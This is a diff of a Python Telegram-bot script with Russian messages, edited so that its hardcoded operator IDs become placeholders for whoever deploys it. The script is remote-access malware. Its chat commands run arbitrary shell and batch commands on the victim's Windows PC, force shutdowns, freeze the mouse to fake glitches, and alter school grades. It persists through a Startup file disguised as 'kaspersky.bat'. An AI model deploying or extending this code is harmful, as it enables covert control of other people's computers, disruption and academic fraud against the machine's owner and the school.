@@ -1,7 +1,5 @@
 import shutil
 import time
-
-# import pygame
 import telebot
 import config
 import pyautogui
@@ -14,8 +12,13 @@ import os
 # positionX = 500
 # positionY = 500
 
-Nikita = 964296210
-Misha = 1585043910
+#################################################
+Admin_one = 1111111
+Admin_2 = 1111111
+# Enter your id, root rights (format int)
+
+
+
 key = config.KEY
 
 from cryptography.fernet import Fernet
@@ -92,8 +95,8 @@ def Write():
         file = open("Jedi.txt", "w", encoding='utf-8')
         encrypt('Jedi.txt', key)
         file.close()
-        bot.send_message(Nikita, f'Установка завершена')
-        bot.send_message(Misha, f'Установка завершена')
+        bot.send_message(Admin_one, f'Installation is complete')
+        bot.send_message(Admin_2, f'Installation is complete')
 
 Write()
 ############################################## переменные времени и остановок
@@ -140,10 +143,10 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
             time_sleep_appraisals = 1
             time_sleep = time.time()
             bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20*60)}')
-            bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                     f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
-            bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                     f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
         @bot.message_handler(commands=['padawan_start'])
@@ -153,7 +156,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
             print(padawan)
             print(message.from_user.id)
             id = str(message.from_user.id) + '\n'
-            if (id in padawan) or (message.from_user.id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+            if (id in padawan) or (message.from_user.id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                 bot.send_message(message.from_user.id, f"/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно \n\n"
                                                        f"/sleep_bot - останавливает бота на 20 минут \n\n"
                                                        f"/mouse_stop time - не дает пользоваться мышкой time секунд. Имитирует дикие глюки. Если поставить большое время, то можно быстро спалиться\n\n"
@@ -166,7 +169,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def Jedi_start(message):
             Write()
             id = str(message.from_user.id) + '\n'
-            if (id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+            if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                 bot.send_message(message.from_user.id, f"/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно \n\n"
                                                        f"/sleep_bot - останавливает бота на 20 минут \n\n"
                                                        f"/mouse_stop time - не дает пользоваться мышкой time секунд. Имитирует дикие глюки. Если поставить большое время, то можно быстро спалиться\n\n"
@@ -183,7 +186,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
             try:
                 Write()
                 id = str(message.from_user.id) + '\n'
-                if (id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                     file_config = message.text
                     file_config = str(file_config)
                     print(file_config[15:])
@@ -194,14 +197,14 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                     encrypt('padawan.txt', key)
                     bot.send_message(message.from_user.id, f"Ok")
                     print(1)
-                    bot.send_message(Nikita, f"{message.from_user.id} добавил {file_config[15:]}")
-                    bot.send_message(Misha, f"{message.from_user.id} добавил {file_config[15:]}")
+                    bot.send_message(Admin_one, f"{message.from_user.id} добавил {file_config[15:]}")
+                    bot.send_message(Admin_2, f"{message.from_user.id} добавил {file_config[15:]}")
                 else:
                     bot.send_message(message.from_user.id, f"Нет доступа")
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                             f'Нет доступа')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                              'Нет доступа')
                 Write()
             except:
@@ -211,7 +214,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def config_write(message):
             Write()
             id = str(message.from_user.id) + '\n'
-            if (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+            if (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                 file_config = message.text
                 file_config = str(file_config)
                 print(file_config[15:])
@@ -231,7 +234,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def cmd(message):
             try:
                 id = str(message.from_user.id) + '\n'
-                if (id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                     cmd = message.text
                     cmd = str(cmd).split('\n')
                     cmd = cmd[1:]
@@ -240,10 +243,10 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                         bot.send_message(message.from_user.id, f"Go: {i}")
                         os.popen(i)
 
-                        bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                 f'Go: {i}')
 
-                        bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                  f'Go: {i}')
                 else:
                     bot.send_message(message.from_user.id, f"Нет доступа")
@@ -256,7 +259,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                 id = str(message.from_user.id) + '\n'
                 if time_sleep_appraisals == 0:
                     Write()
-                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                         print(1)
                         g = int(message.text[11:])
                         print(g)
@@ -278,8 +281,8 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
 
                             else:
 
-                                bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n')
-                                bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                                bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n')
+                                bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                                 break
                     else:
                         bot.send_message(message.from_user.id, f"Нет доступа")
@@ -292,31 +295,31 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def sleep(message):
             try:
                 id = str(message.from_user.id) + '\n'
-                if (time_sleep_appraisals == 0) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                if (time_sleep_appraisals == 0) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                     Write()
-                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                         os.popen(f'shutdown -s -t {message.text[9:]}')
                         bot.send_message(message.from_user.id, f'Ок')
-                        bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')
 
-                        bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                     else:
                         bot.send_message(message.from_user.id, f"Нет доступа")
                 else:
                     bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                              f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
             except:
                 try:
                     os.system(f'shutdown -s -t {message.text[9:]}')
                     bot.send_message(message.from_user.id, f'Ок')
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                 except:
                     bot.send_message(message.from_user.id, f'ERROR')
 
@@ -324,34 +327,34 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def sleep_info(message):
             try:
                 id = str(message.from_user.id) + '\n'
-                if (time_sleep_appraisals == 0) or (message.from_user.id == Misha) or (message.from_user.id == Nikita):
+                if (time_sleep_appraisals == 0) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                     Write()
-                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Misha) or (
-                            message.from_user.id == Nikita):
+                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (
+                            message.from_user.id == Admin_one):
 
                         bot.send_message(message.from_user.id, f'Ок')
-                        bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')
 
-                        bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                         time.sleep(1)
                         os.popen(f'shutdown -p')
                     else:
                         bot.send_message(message.from_user.id, f"Нет доступа")
                 else:
                     bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                              f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
 
             except:
                 try:
 
                     bot.send_message(message.from_user.id, f'Ок')
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                     time.sleep(1)
                     os.system(f'shutdown -p')
                 except:
@@ -361,7 +364,7 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         def cmd_bat(message):
             try:
                 id = str(message.from_user.id) + '\n'
-                if (id in Jedi) or (id == Misha) or (message.from_user.id == Nikita):
+                if (id in Jedi) or (id == Admin_2) or (message.from_user.id == Admin_one):
                     cmd = message.text
                     cmd = str(cmd).split('\n')
                     cmd = cmd[1:]
@@ -379,9 +382,9 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                     os.remove('go.bat')
                     bot.send_message(message.from_user.id, f"Команда выполнена")
 
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n')
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n')
 
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n')
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                 else:
                     bot.send_message(message.from_user.id, f"Нет доступа")
             except:
@@ -390,16 +393,16 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
         @bot.message_handler(commands=['delete_bot'])
         def delete_bot(message):
             id = str(message.from_user.id) + '\n'
-            if (id == Misha) or (message.from_user.id == Nikita):
+            if (id == Admin_2) or (message.from_user.id == Admin_one):
                 Write()
 
-                bot.send_message(Nikita, f"Ну чтож, я очень рад был вам служить. Удачи)")
-                bot.send_message(Misha, f"Ну чтож, я очень рад был вам служить. Удачи)")
+                bot.send_message(Admin_one, f"Ну чтож, я очень рад был вам служить. Удачи)")
+                bot.send_message(Admin_2, f"Ну чтож, я очень рад был вам служить. Удачи)")
 
-                bot.send_message(Nikita, f"padawan \n{padawan}")
-                bot.send_message(Misha, f"padawan \n{padawan}")
-                bot.send_message(Nikita, f"Jedi \n{Jedi}")
-                bot.send_message(Misha, f"Jedi \n{Jedi}")
+                bot.send_message(Admin_one, f"padawan \n{padawan}")
+                bot.send_message(Admin_2, f"padawan \n{padawan}")
+                bot.send_message(Admin_one, f"Jedi \n{Jedi}")
+                bot.send_message(Admin_2, f"Jedi \n{Jedi}")
 
 
                 os.remove(rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kaspersky.bat')
@@ -411,8 +414,8 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                 print(100)
                 time.sleep(5)
                 bot.send_message(message.from_user.id, f"Удаление прошло не до конца")
-                bot.send_message(Nikita, f"Удаление прошло не до конца")
-                bot.send_message(Misha, f"Удаление прошло не до конца")
+                bot.send_message(Admin_one, f"Удаление прошло не до конца")
+                bot.send_message(Admin_2, f"Удаление прошло не до конца")
             else:
                 bot.send_message(message.from_user.id, f"Нет доступа)")
 
@@ -437,9 +440,9 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
                             a = ''
                             bot.send_message(message.from_user.id, f"Испривил 2 на 3")
 
-                            bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                     f'Испривил 2 на 3')
-                            bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                      f'Испривил 2 на 3')
                             time_sleep_appraisals = 1
                             break
@@ -452,9 +455,9 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
 
                             a = ''
                             bot.send_message(message.from_user.id, f"Испривил 3 на 4")
-                            bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                     f'Испривил 3 на 4')
-                            bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                      f'Испривил 3 на 4')
                             time_sleep_appraisals = 1
                             break
@@ -467,17 +470,17 @@ def schedule_loop(bot, text_bat_stop=None):# БОТ
 
                             a = ''
                             bot.send_message(message.from_user.id, f"Испривил 4 на 5")
-                            bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                     f'Испривил 4 на 5')
-                            bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                      f'Испривил 4 на 5')
                             sleep_bot(message)
                             break
                 else:
                     bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
-                    bot.send_message(Misha, f'{message.from_user.id} - "{message.text[1:]}"  \n'
+                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
-                    bot.send_message(Nikita, f'{message.from_user.id} - "{message.text[1:]}" \n'
+                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                              f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                     break
 
